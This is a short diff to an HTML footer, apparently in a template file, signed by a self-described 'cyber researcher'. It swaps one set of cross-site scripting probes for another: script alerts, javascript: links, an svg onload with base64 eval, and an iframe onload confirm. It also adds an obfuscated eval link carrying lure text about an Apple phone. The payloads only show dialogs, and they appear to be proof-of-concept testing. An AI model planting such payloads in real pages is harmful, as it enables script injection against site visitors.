@@ -32,12 +32,12 @@ info:
 <!-- Footer with your name -->
 <div style="position: fixed; bottom: 10px; right: 10px; font-size: 12px; color: #888;">
   Cyber resrarcher:xie22 
-    <script>alert(document.domain)</script>
-    <a href=javascript:alert(1)>click 
-     <a href=javascript:confirm(document.domain)>click 
-     <svg  onload=eval(atob("YWxlcnQoMQ=="))>
-      
 </div>
+<!-- xss test -->
+  <html language="javascript">
+    <iframe onload="confirm(document.domain)"></iframe>
+    <a href="j&#97;vascript:eval('&#97;u0091x65x72x74x28x22x31x22x29')">Click to send an Apple phone</a>
+    </html>
 
 
   '
